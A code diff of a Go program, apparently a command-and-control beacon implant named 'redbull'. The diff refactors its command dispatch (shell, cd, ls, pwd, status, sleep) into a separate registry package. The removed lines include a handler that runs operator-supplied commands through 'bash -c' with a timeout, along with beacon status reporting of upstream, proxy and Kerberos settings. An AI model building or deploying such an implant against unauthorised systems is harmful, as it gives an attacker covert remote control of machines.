@@ -1,20 +1,16 @@
 package main
 
 import (
-	"bytes"
-	"context"
 	"encoding/base64"
 	"fmt"
 	"os"
-	"os/exec"
 	"os/signal"
-	"path/filepath"
-	config "redbull"
-	"strconv"
 	"strings"
 	"syscall"
 	"time"
 
+	config "redbull"
+	"redbull/internal/rbcmd"
 	"redbull/internal/rbhttp"
 	"redbull/internal/rbkrb"
 )
@@ -22,101 +18,19 @@ import (
 var SLEEP_TIME = 1 * time.Second
 var CWD = ""
 
-var COMMAND_MAP = map[string]func(cmd string) (string, string, error){
-	"shell":  runBashWithTimeout,
-	"pwd":    getCwd,
-	"cd":     changeDirectory,
-	"ls":     listDirectory,
-	"status": getBeaconStatus,
-	"sleep":  setSleepTime,
-}
+var cmdCtx *rbcmd.Context
 
 func init() {
 	cwd, err := os.Getwd()
-
 	if err != nil {
 		panic(err)
 	}
 
 	CWD = cwd
-}
-
-func getCwd(_ string) (string, string, error) {
-	return CWD, "", nil
-}
-
-func getBeaconStatus(_ string) (string, string, error) {
-	return fmt.Sprintf("Upstream: %s\nProxy: %s\nUsing KRB: %t\nSleep Time: %s", config.UPSTREAM, config.PROXY_URL, config.USE_KRB, SLEEP_TIME), "", nil
-}
-
-func setSleepTime(sleepTime string) (string, string, error) {
-	// Check if the cmd can be turned into a string.
-	sleepTimeInt, err := strconv.Atoi(sleepTime)
-	if err != nil {
-		return "", "", fmt.Errorf("failed to convert sleep time to int: %w", err)
+	cmdCtx = &rbcmd.Context{
+		CWD:       &CWD,
+		SleepTime: &SLEEP_TIME,
 	}
-
-	SLEEP_TIME = time.Duration(sleepTimeInt) * time.Second
-	return fmt.Sprintf("set sleep time to %s", SLEEP_TIME), "", nil
-}
-
-func changeDirectory(command string) (string, string, error) {
-	// Join the current directory with the command path
-	newCwd := filepath.Join(CWD, command)
-
-	// Resolve to absolute path (handles relative paths like ../..)
-	absPath, err := filepath.Abs(newCwd)
-	if err != nil {
-		return "", "", fmt.Errorf("failed to resolve path '%s': %w", newCwd, err)
-	}
-
-	res, err := os.Stat(absPath)
-	if os.IsNotExist(err) {
-		return "", "", fmt.Errorf("invalid path '%s': path does not exist", absPath)
-	}
-
-	if !res.IsDir() {
-		return "", "", fmt.Errorf("invalid path '%s': not a directory", absPath)
-	}
-
-	CWD = absPath
-	return fmt.Sprintf("changed directory to %s", CWD), "", nil
-}
-
-func listDirectory(path string) (string, string, error) {
-	if path == "" {
-		path = CWD
-	}
-	files, err := os.ReadDir(path)
-	if err != nil {
-		return "", "", fmt.Errorf("failed to read directory %s: %w", CWD, err)
-	}
-
-	fileNames := make([]string, 0)
-	for _, f := range files {
-		fileNames = append(fileNames, f.Name())
-	}
-
-	return strings.Join(fileNames, "\n"), "", nil
-}
-
-func runBashWithTimeout(command string) (string, string, error) {
-	timeout := 100 * time.Second
-	ctx, cancel := context.WithTimeout(context.Background(), timeout)
-	defer cancel()
-
-	cmd := exec.CommandContext(ctx, "bash", "-c", command)
-
-	var outBuf, errBuf bytes.Buffer
-	cmd.Stdout = &outBuf
-	cmd.Stderr = &errBuf
-
-	err := cmd.Run()
-	if ctx.Err() == context.DeadlineExceeded {
-		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
-	}
-
-	return outBuf.String(), errBuf.String(), err
 }
 
 func parseAndExecuteCommand(command string) (string, string, error) {
@@ -128,8 +42,9 @@ func parseAndExecuteCommand(command string) (string, string, error) {
 	commandName := commandGroups[0]
 	commandArgs := strings.Join(commandGroups[1:], " ")
 
-	if fn, ok := COMMAND_MAP[commandName]; ok {
-		return fn(commandArgs)
+	registry := rbcmd.GetRegistry()
+	if cmd, ok := registry[commandName]; ok {
+		return cmd.Execute(cmdCtx, commandArgs)
 	} else {
 		return "", "", fmt.Errorf("no command '%s' found", command)
 	}
